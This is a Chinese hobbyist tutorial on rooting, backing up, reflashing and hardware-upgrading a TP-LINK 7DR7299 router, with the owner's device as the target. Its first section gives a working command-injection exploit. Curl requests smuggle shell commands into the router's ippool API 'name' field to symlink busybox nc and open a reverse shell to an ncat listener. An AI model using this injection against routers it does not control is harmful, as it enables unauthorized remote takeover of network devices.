# TP-LINK 7DR7299 刷机救砖和改内存闪存教程

我的测试未必全面，仅供参考。刷机有风险，后果自负。

## 0.下载教程及文件

直接下载教程及配套文件压缩包：
- https://github.com/lgs2007m/Actions-OpenWrt/releases/tag/Router-Flashing-Files

## 1.获取后台权限
### 方法1：反弹 shell（推荐）

https://github.com/ALaggyDev/TPLink-Vulns/tree/main/reverse_shell

### 方法2：先升级官方 debug 固件，再升级开启了 telnet 的官方固件

telnet 密码：tdmp7299mv1s1

固件文件：`7dr7299mv1_cn_1_0_9_up_boot(260519)_2026-05-19_20.26.11.bin`

下载链接：
https://pan.baidu.com/share/init?surl=-cWAAXYCGPJdQcBcDQQVeg&pwd=7299

感谢 Github 上的 voz188 大佬提供的方法：
https://github.com/immortalwrt/immortalwrt/discussions/2309

---
### 下面使用反弹 shell 获取后台权限

安装好 nmap 之后，打开 CMD 运行 ncat 命令监听 99 端口：

```
ncat -lvnp 99
```

根据实际情况修改下面命令中的参数值：
- stok 是管理后台的临时身份验证令牌。将路由器连接电脑，用浏览器登录路由器后台，按 F12 打开开发者工具，点击 Network，点击左侧 Name 中的 ds，在右侧 Headers 的 Request URL 下可找到 stok。用实际值替换下面命令中的 stok，注意 stok 不包含尾部 `/ds` 字符。
- router 是路由器地址，如与实际不符请修改。
- pc 是电脑的 IP，一般 TP 路由器分配的是 192.168.1.100，如不是请改为实际 IP。

安装 Git for Windows 后，打开 Git Bash，将下面命令批量复制粘贴运行：

```
export stok="OP7AlzRtA5RD2XBEGW5GR5j0Zet465sD"
export router="192.168.1.1"
export pc="192.168.1.100"
export URL="http://${router}/stok=${stok}/ds"

curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";ln -sf opt/*/*/*/busybox nc&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' "$URL"
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' "$URL"
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";ln -sf opt/*/*/*/busybox sh&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' "$URL"
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' "$URL"
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";/nc '"${pc}"' 99 -e /sh&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' "$URL"
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' "$URL"
```

四条命令均返回下面的信息，即表示反弹 shell 获取成功：

```
{"ippool":{"name":"ippool_1"},"error_code":0}{"error_code":0}
```

回到刚才的 CMD 窗口，会显示 `Ncat: Connection from 192.168.1.1:******`

---

## 2.查看和备份原厂分区

输入下面命令：
```
cat /proc/mtd
```

原厂分区输出：

```
dev:    size   erasesize  name
mtd0: 00100000 00020000 "factory_boot"
mtd1: 00020000 00020000 "factory_info"
mtd2: 000a0000 00020000 "art"
mtd3: 00200000 00020000 "config"
mtd4: 000a0000 00020000 "normal_boot"
mtd5: 00560000 00020000 "kernel"
mtd6: 028e0000 00020000 "rootfs"
mtd7: 00dc0000 00020000 "rootfs_data"
mtd8: 03c20000 00020000 "firmware"
mtd9: 000a0000 00020000 "normal_boot_bak"
mtd10: 00560000 00020000 "kernel_bak"
mtd11: 028e0000 00020000 "rootfs_bak"
mtd12: 00dc0000 00020000 "rootfs_data_bak"
mtd13: 03c20000 00020000 "firmware_bak"
mtd14: 00020000 00020000 "boot_flag"
mtd15: 08000000 00020000 "spi0.0"
```
factory_boot 分区包含原厂 BL2（也包含主 U-Boot），normal_boot 分区是原厂 Facboot 中的 U-Boot（对应刷机后的 fip 分区数据），原厂系统启动时，从 TTL 日志中可以看到两个 U-Boot 的信息。

| U-Boot | 版本 | 角色 |
|---|---|---|
| 第一个 | 2024.01 | **主 U-Boot**：正常引导链、双镜像校验、加载并跳转 Facboot |
| 第二个 | 2023.04 | **恢复/工厂镜像（Facboot）内的 U-Boot**：在 Facboot 路径下引导默认 OpenWrt 镜像 |


art 和 factory_info 分区对应刷机后的 factory 分区（无线校准数据），其中包含 WAN 口的加密数据，具有唯一性，非常重要。

如需拼接得到 Factory 分区，右键在备份文件夹下运行 Git Bash，复制粘贴运行以下命令：
```
tr '\000' '\377' < /dev/zero | head -c $((0x400000)) > factory.bin && \
dd if=mtd2_art.bin of=factory.bin bs=1024 seek=0 conv=notrunc && \
dd if=mtd1_factory_info.bin of=factory.bin bs=1024 seek=$((0x1e0000/1024)) conv=notrunc && \
ls -l factory.bin && md5sum factory.bin
```

总结下：

- `factory_boot` 对应刷机后的 **BL2 分区**；
- `art` + `factory_info` 经过特定的拼接后对应刷机后的 **Factory 分区**；
- `normal_boot` 对应刷机后的 **FIP 分区**即 U-Boot 分区（两者有数据部分相同，但刷机后的 FIP 分区大一些）。


### 备份原厂分区
解压并运行 tftpd64，Server interface 选择 192.168.1.100。如果电脑网卡 IP 不是这个，请自行选择正确的网卡，并用搜索替换修改下面备份命令中的 IP。注：tftpd64 需要防火墙放行，或临时关闭防火墙软件。

备份整个闪存，大概要5分多钟，耐心等待显示 `--->mtd15_spi0.0完成`，再运行备份分区的命令：

```
dd if=/dev/mtdblock15 of=/tmp/mtd15_spi0.0.bin && tftp -p -l /tmp/mtd15_spi0.0.bin -r mtd15_spi0.0.bin 192.168.1.100 && echo "--->mtd15_spi0.0完成"
```

备份分区，可以批量复制粘贴运行，大概需要5分多钟，耐心等待最后显示 `--->mtd14_boot_flag完成` 即可：

```
dd if=/dev/mtdblock0 of=/tmp/mtd0_factory_boot.bin && tftp -p -l /tmp/mtd0_factory_boot.bin -r mtd0_factory_boot.bin 192.168.1.100 && echo "--->mtd0_factory_boot完成"
dd if=/dev/mtdblock1 of=/tmp/mtd1_factory_info.bin && tftp -p -l /tmp/mtd1_factory_info.bin -r mtd1_factory_info.bin 192.168.1.100 && echo "--->mtd1_factory_info完成"
dd if=/dev/mtdblock2 of=/tmp/mtd2_art.bin && tftp -p -l /tmp/mtd2_art.bin -r mtd2_art.bin 192.168.1.100 && echo "--->mtd2_art完成"
dd if=/dev/mtdblock3 of=/tmp/mtd3_config.bin && tftp -p -l /tmp/mtd3_config.bin -r mtd3_config.bin 192.168.1.100 && echo "--->mtd3_config完成"
dd if=/dev/mtdblock4 of=/tmp/mtd4_normal_boot.bin && tftp -p -l /tmp/mtd4_normal_boot.bin -r mtd4_normal_boot.bin 192.168.1.100 && echo "--->mtd4_normal_boot完成"
dd if=/dev/mtdblock5 of=/tmp/mtd5_kernel.bin && tftp -p -l /tmp/mtd5_kernel.bin -r mtd5_kernel.bin 192.168.1.100 && echo "--->mtd5_kernel完成"
dd if=/dev/mtdblock6 of=/tmp/mtd6_rootfs.bin && tftp -p -l /tmp/mtd6_rootfs.bin -r mtd6_rootfs.bin 192.168.1.100 && echo "--->mtd6_rootfs完成"
dd if=/dev/mtdblock7 of=/tmp/mtd7_rootfs_data.bin && tftp -p -l /tmp/mtd7_rootfs_data.bin -r mtd7_rootfs_data.bin 192.168.1.100 && echo "--->mtd7_rootfs_data完成"
dd if=/dev/mtdblock8 of=/tmp/mtd8_firmware.bin && tftp -p -l /tmp/mtd8_firmware.bin -r mtd8_firmware.bin 192.168.1.100 && echo "--->mtd8_firmware完成"
dd if=/dev/mtdblock9 of=/tmp/mtd9_normal_boot_bak.bin && tftp -p -l /tmp/mtd9_normal_boot_bak.bin -r mtd9_normal_boot_bak.bin 192.168.1.100 && echo "--->mtd9_normal_boot_bak完成"
dd if=/dev/mtdblock10 of=/tmp/mtd10_kernel_bak.bin && tftp -p -l /tmp/mtd10_kernel_bak.bin -r mtd10_kernel_bak.bin 192.168.1.100 && echo "--->mtd10_kernel_bak完成"
dd if=/dev/mtdblock11 of=/tmp/mtd11_rootfs_bak.bin && tftp -p -l /tmp/mtd11_rootfs_bak.bin -r mtd11_rootfs_bak.bin 192.168.1.100 && echo "--->mtd11_rootfs_bak完成"
dd if=/dev/mtdblock12 of=/tmp/mtd12_rootfs_data_bak.bin && tftp -p -l /tmp/mtd12_rootfs_data_bak.bin -r mtd12_rootfs_data_bak.bin 192.168.1.100 && echo "--->mtd12_rootfs_data_bak完成"
dd if=/dev/mtdblock13 of=/tmp/mtd13_firmware_bak.bin && tftp -p -l /tmp/mtd13_firmware_bak.bin -r mtd13_firmware_bak.bin 192.168.1.100 && echo "--->mtd13_firmware_bak完成"
dd if=/dev/mtdblock14 of=/tmp/mtd14_boot_flag.bin && tftp -p -l /tmp/mtd14_boot_flag.bin -r mtd14_boot_flag.bin 192.168.1.100 && echo "--->mtd14_boot_flag完成"
```

---

## 3.刷写 BL2 与 U-Boot

BL2 和 U-Boot 基于 Yuzhii0718 大佬的 bl-mt798x-dhcpd 仓库修改适配，闪存使用 SPI 单线模式。

Yuzhii0718 大佬的 U-Boot 支持 DHCP 等众多功能，在此表示感谢。

将 BL2 和 U-Boot 文件放到与 tftpd64 相同的文件夹内，然后运行下面命令上传文件：

```
tftp -g -l /tmp/bl2-mt7988_tplink_tl-7dr7299-v1_2025-fit.bin -r bl2-mt7988_tplink_tl-7dr7299-v1_2025-fit.bin 192.168.1.100 && echo "--->bl2下载完成"
tftp -g -l /tmp/fip-mt7988_tplink_tl-7dr7299-v1_2025-Yuzhii-dhcpd-fit.bin -r fip-mt7988_tplink_tl-7dr7299-v1_2025-Yuzhii-dhcpd-fit.bin 192.168.1.100  && echo "--->U-Boot上传完成"
```

查看文件：

```
md5sum /tmp/*7dr7299*
```

写入 BL2 和 U-Boot：

```
dd bs=131072 conv=sync seek=0 count=8 of=/dev/mtdblock15 if=/tmp/bl2-mt7988_tplink_tl-7dr7299-v1_2025-fit.bin && sync && echo "--->bl2刷写完成"
dd bs=131072 conv=sync seek=44 count=8 of=/dev/mtdblock15 if=/tmp/fip-mt7988_tplink_tl-7dr7299-v1_2025-Yuzhii-dhcpd-fit.bin && sync && echo "--->fip刷写完成"
```
bl2 和 fip 都显示刷写完成即可。

刷写命令中的偏移量说明：

- BL2 从 `0x0000000` 开始：`bs=131072 × seek=0 = 0 byte`
- U-Boot 从 `0x0580000` 开始：`bs=131072 × seek=44 = 5767168 byte = 0x580000`

## 4.进入 U-Boot Web failsafe 刷写固件

刷写完成后直接拔电，将网线插入千兆 LAN 口（注意不支持 2.5G 口），然后上电时按住 Reset 不放，等待前端指示灯变红并闪烁，即进入 U-Boot Web failsafe，浏览器打开 http://192.168.1.1 刷写 ubi 119.5MB 的 itb 固件即可。ImmortalWrt 主线和 237 大佬的闭源驱动固件都可以。

刷完成后，建议先不重启，选择“闪存备份”页面备份下刷机后的分区，后期恢复分区也可以在 U-Boot “闪存编辑”页面中恢复这个备份，很方便。

PS：237 大佬闭源固件的 Factory 分区首字母大写，ImmortalWrt 主线固件的 factory 分区为全小写。

这个 U-Boot 的 ubi 分区是 119.5MB，DTS 中为 0x7780000：

```
partition@880000 {
    compatible = "linux,ubi";
    reg = <0x880000 0x7780000>;
    label = "ubi";

    volumes {
        ubi_rootdisk: ubi-volume-fit {
            volname = "fit";
        };
    };
};
```

- ## 5.刷回原厂
我这刷回原厂，建议直接刷整个原厂闪存的备份 spi0.0。

网线插千兆LAN口（注意不支持 2.5G 口），路由器上电，按住 Reset 键，等待路由器指示灯由绿色闪烁变为红色常亮，即进入了 U-Boot Web failsafe。

U-Boot 支持 DHCP，直接打开浏览器，输入 http://192.168.1.1 ，点击“更新 SIMG”，直接刷写 128M 的 spi0.0 原厂闪存备份即可。

- ## 6.串口 TTL 救砖
注意：mtk_uartboot 串口 TTL 救砖文件夹下的 BL2 仅用于救砖，不要刷入正常机器。

路由器断电，网线插千兆LAN口（注意不支持 2.5G 口），使用 USB 转 TTL（建议使用3.3V电平的，推荐使用 FT232RL）连接路由器串口 TTL 接口。

运行串口 TTL 救砖文件夹下的“打开设备管理器命令.bat”，在设备管理器中查看 USB 转 TTL 设备对应的 COM 端口号。

关闭可能占用该 COM 口的程序，运行“MT798X串口TTL救砖命令.bat”，输入该 COM 端口号，选择正常波特率，再选择对应机型的 FIP（U-Boot） 序号，程序会进入等待握手阶段。

路由器上电开始握手，等待上传 Ram Boot BL2 和 FIP（U-Boot），看到 FIP 传输完成后，按住向下键不放，选择 `7. Start Web failsafe` 并回车，开启 U-Boot Web failsafe，浏览器打开 http://192.168.1.1 。

mtk_uartboot 加载的 U-Boot 是临时的，需要进入 U-Boot Web failsafe，重新刷写变砖的分区。  


# 改内存和闪存
## 注：改闪存后不支持原厂系统，刷回原厂系统虽能启动，但不能联网

<details>
<summary>点击展开</summary>

## 1.改内存

原厂内存是晶豪的M16U4G16256A-QLBG，DDR4-3200，16 位，单颗容量 512MB，两颗组成 1GB 内存。

我手头剩余两颗镁光 D9ZFW，DDR4-3200，单颗 2GB，两颗组成 4GB。没改 8GB 是因为觉得 4GB 够用，而且现在 8GB 太贵。

还可以选择海力士 H5ANAG6NJC-RXNC，它是窄体颗粒，比较好焊接。三星 K4A4G165WF-BCWE 太宽，可能碰到旁边的电阻，不建议使用。

改完内存不要立即上电，先测量旁边内存的 VDD/VDDQ 和 VPP 是否短路，确认没有短路再上电。

然后启动系统，通过 SSH 登录并输入下面命令测试内存：
```
dd if=/dev/zero of=/tmp/mtest bs=1M count=10000000
```
该命令会在 /tmp 下生成一个大小为内存一半的 mtest 文件，占满 /tmp。不死机说明内存识别没问题；是否稳定需运行一段时间才能确定。

测试后删除 /tmp 文件夹下这个文件即可：
```
rm /tmp/mtest
```


## 2.改闪存

原本为了启动原厂系统，我解压了原厂 U-Boot 和固件，查找驱动支持哪些闪存。但改好后原厂系统虽能启动，却不能联网。查询后发现，有网友给 TP-LINK 路由器更换闪存并刷回编程器备份后，系统能启动但无法联网。不知原厂固件是否绑定了闪存。

我选择了原厂 BL2 支持的 2k+64 闪存：

- **512MB：GD5F4GQ4UAYIG**（拆机闪存，已测试`不支持`原厂系统启动，不知是不是版本不同）
- **256MB：MX35LF2GE4AD-Z4I**（拆机闪存，已测试原厂系统可正常启动，但是不能联网）

最后我改了 256MB 的 MX35LF2GE4AD-Z4I，目前只能使用 ImmortalWrt。

改完闪存后直接用 mtk_uartboot 串口 TTL 救砖加载临时 U-Boot，等显示 FIP 传输完成后，按住向下键不放，选择 `7. Start Web failsafe` 并回车，开启 U-Boot Web failsafe，浏览器打开 http://192.168.1.1 ，选择“更新SIMG”，恢复原厂整个闪存 spi0.0 备份，恢复好后无需重启，接着更新支持该闪存内部结构的 BL2（我这个闪存就是 2k+64）和 multi_layout 多分区 U-Boot。更新完成后重启重新进入 U-Boot Web failsafe，先选择分区，再上传固件刷写。

对于 256MB 闪存，可刷写 ubi 119.5MB 和 ubi 247.5MB 固件；512MB 闪存还可刷写 ubi 503.5MB 固件。

注：这个 multi_layout 多分区 U-Boot 开启了闪存 SPI 4 线模式（4X_OP）；为了兼容不同大小的 ubi 分区，每次刷机都会擦除重建 ubi 并新建分区卷。

如果要编译 ubi 247.5MB 的固件，需要修改固件源码 DTS 中的 ubi 分区大小为 0xf780000：

```
partition@880000 {
    compatible = "linux,ubi";
    reg = <0x880000 0xf780000>;
    label = "ubi";

    volumes {
        ubi_rootdisk: ubi-volume-fit {
            volname = "fit";
        };
    };
};
```
如果要编译 ubi 503.5MB 的固件，需要修改固件源码 DTS 中的 ubi 分区大小为 0x1f780000：

```
partition@880000 {
    compatible = "linux,ubi";
    reg = <0x880000 0x1f780000>;
    label = "ubi";

    volumes {
        ubi_rootdisk: ubi-volume-fit {
            volname = "fit";
        };
    };
};
```

## 更换固态电容
改完内存和闪存后，更换了固态电容。电容参数：12V 输入端为 16V 470uF 8×12mm；USB 5V 输出端为 16V 220uF 6×11mm。

</details>